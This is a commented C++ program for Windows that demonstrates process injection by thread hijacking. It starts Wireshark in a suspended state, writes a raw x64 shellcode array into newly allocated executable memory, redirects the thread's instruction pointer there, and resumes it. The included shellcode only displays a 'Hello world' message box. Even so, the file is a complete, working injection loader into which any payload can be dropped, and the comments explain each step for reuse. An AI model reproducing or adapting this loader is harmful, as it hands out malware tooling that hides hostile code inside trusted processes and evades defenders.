#include <windows.h>
#include <iostream>

int main() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPVOID allocatedMemory;
    HANDLE hProcess;
    DWORD oldProtect;
    const wchar_t* exePath = L"C:\\Program Files\\Wireshark\\Wireshark.exe"; // Choose any path for an .exe file, I chose WireShark


    ZeroMemory(&si, sizeof(si)); // Fills both blocks of memory (startup info, process_information) with zeroes to prevent any issues
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(exePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { // create a process in a suspended state
        std::cerr << "createprocess failed with error " << GetLastError() << std::endl;             // "&si, &pi" stores the startup info and process info to their respective variables (si, pi)
        return 1;
    }

    hProcess = pi.hProcess; // pi stores the process information of the created process in a suspended state including the handle of the process
    allocatedMemory = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocatedMemory) {
        std::cerr << "VirtualAllocEx failed with error " << GetLastError() << std::endl;
        return 1;
    }


    unsigned char shellcode[] = {
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3" //hello world messagebox
        
    };

    if (!WriteProcessMemory(hProcess, allocatedMemory, shellcode, sizeof(shellcode), NULL)) { //write shellcode to allocated buffer
        std::cerr << "WriteProcessMemory failed with error " << GetLastError() << std::endl;
        return 1;
    }

    if (!VirtualProtectEx(hProcess, allocatedMemory, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect)) { // protect memory region and save old protection settings to oldProtect
        std::cerr << "VirtualProtectEx failed with error " << GetLastError() << std::endl;
        return 1;
    }

    CONTEXT context; //set context
    ZeroMemory(&context, sizeof(CONTEXT)); // clear memory
    context.ContextFlags = CONTEXT_CONTROL;  // only recieve control registers
    if (!GetThreadContext(pi.hThread, &context)) { // again, pi stores process information of the created suspended process, also including hThread - handle to a thread, get thread context and store it to context variable 
        std::cerr << "GetThreadContext failed with error " << GetLastError() << std::endl;
        return 1;
    }

    context.Rip = (DWORD_PTR)allocatedMemory; // look for the Rip register inside of the context variable (which we stored the context of the thread to) and overwrite the RIP (instruction pointer register) with the buffer
    // rip is a cpu register which points to the next instruction that will be executed by the CPU
    // by overwriting it with the buffer with the shellcode stored it in, we essentially redirect the execution flow and have the program execute our payload


    if (!SetThreadContext(pi.hThread, &context)) { // set new thread context
        std::cerr << "SetThreadContext failed with error " << GetLastError() << std::endl;
        return 1;
    }

    if (ResumeThread(pi.hThread) == -1) { // we created the process in a suspended state, here we resume it and execute the payload
        std::cerr << "ResumeThread failed with error " << GetLastError() << std::endl;
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);




/* if (!VirtualProtectEx(hProcess, allocatedMemory, sizeof(shellcode), oldProtect, &oldProtect)) {
        std::cerr << "VirtualProtectEx failed to restore original protection with error " << GetLastError() << std::endl;
        return 1;
    }*/

    // Encountered an issue here, the part above restores the old protection settings but im recieving error 0x05 - access denied
    // Not a hard fix although not neccesary, so challenge yourself




    CloseHandle(pi.hProcess); //cleanup
    CloseHandle(pi.hThread);

    return 0;
}
